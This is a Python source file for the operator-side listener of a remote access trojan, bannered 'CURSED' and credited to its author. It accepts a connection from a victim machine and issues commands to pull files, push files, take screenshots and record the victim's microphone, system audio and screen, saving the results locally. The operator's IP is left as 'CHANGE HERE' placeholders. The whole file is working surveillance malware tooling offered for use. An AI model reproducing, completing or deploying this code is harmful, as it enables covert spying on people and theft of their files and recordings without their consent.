import socket
import base64
import os
import sys
from colorama import Fore
import simplejson
import ast

appdata = os.getenv('APPDATA')

class SocketListener:
    def __init__(self,ip,port):
        mysock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        mysock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        mysock.bind((ip,port))
        mysock.listen(0)
        print(Fore.RED)
        print(bold+"Listening Started...")
        (self.my_connection,my_address) = mysock.accept()
        print(red+" Connected >> IP " + str(my_address) + "\n")
        print(Fore.YELLOW)
        print(bold+"""Hello, Port and IP Forwarding are enabled. Type 'help' to see what it can do.\n""")

    def sendToClientData(self,data):
        self.my_connection.sendto(data.encode("utf-8"),("CHANGE HERE",8080))

    def clientRecv(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.my_connection.recv(1024).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue

    def commandExecution(self,command_input):
        self.sendToClientData(command_input)
        extcommand_input = command_input
        extcommand_inputList = ast.literal_eval(extcommand_input)
        if extcommand_inputList[0] == "exit":
            self.my_connection.close()
            exit()
        return self.clientRecv()

    def saveAnyFile(self,path,content):
        with open("/root/Desktop/"+path,"wb") as my_file:
            my_file.write(base64.b64decode(content))
            return "\tFile saved..."

    def getFileMethod(self,path):
        with open(path,"rb") as my_file:
            return base64.b64encode(my_file.read())

    def start_listener(self):
        while True:
            print(Fore.RED)
            command_input = input(">> ")
            command_input = command_input.split(" ")
            try:
                print(Fore.GREEN)
                
                if command_input[0] == "upload":
                    command_output = self.getFileMethod(command_input[1])
                    command_input.append(command_output)

                command_output = self.commandExecution(str(command_input))

                if command_input[0] == "download":
                    command_output = self.saveAnyFile(command_input[1],command_output)

                if command_input[0] == "screenshot":
                    command_output = self.saveAnyFile("hellodad.png",command_output)
                    os.system("open ~/Desktop/hellodad.png")

                if command_input[0] == "recordvoice":
                    command_output = self.saveAnyFile("outputMicrophone.wav",command_output)
                
                if command_input[0] == "recordcomputer":
                    command_output = self.saveAnyFile("outputComputer.wav",command_output)

                if command_input[0] == "recordscreen":
                    command_output = self.saveAnyFile("outputScreen.avi",command_output)

                if command_input[0] == "clear":
                    os.system('clear') 
                    command_output = ""

            except Exception as e:
                print(Fore.RED)
                command_output = "No such command found, please use 'help' (SERVER-MESSAGE).\n"+str(e)
            print(command_output)


#Colors
red = '\033[31m'
yellow = '\033[93m'
lgreen = '\033[92m'
clear = '\033[0m'
bold = '\033[01m'

os.system('clear')

#banner of script
print (red+"""\n
       .oooooo.   ooooo     ooo ooooooooo.    .oooooo..o oooooooooooo oooooooooo.   
      d8P'  `Y8b  `888'     `8' `888   `Y88. d8P'    `Y8 `888'     `8 `888'   `Y8b  
     888           888       8   888   .d88' Y88bo.       888          888      888 
     888           888       8   888ooo88P'   `"Y8888o.   888oooo8     888      888 
     888           888       8   888`88b.         `"Y88b  888    "     888      888 
     `88b    ooo   `88.    .8'   888  `88b.  oo     .d8P  888       o  888     d88' 
      `Y8bood8P'     `YbodP'    o888o  o888o 8""88888P'  o888ooooood8 o888bood8P'   
"""+red)
print (red+"\t\t\t\t\t\t | coded by Utkay FIRAT | \n"+clear)

try:

    my_socket_listener = SocketListener("CHANGE HERE",8080)
    
    my_socket_listener.start_listener()

except KeyboardInterrupt:
    print(lgreen+bold+"\n\tBye dude...")
    sys.exit()
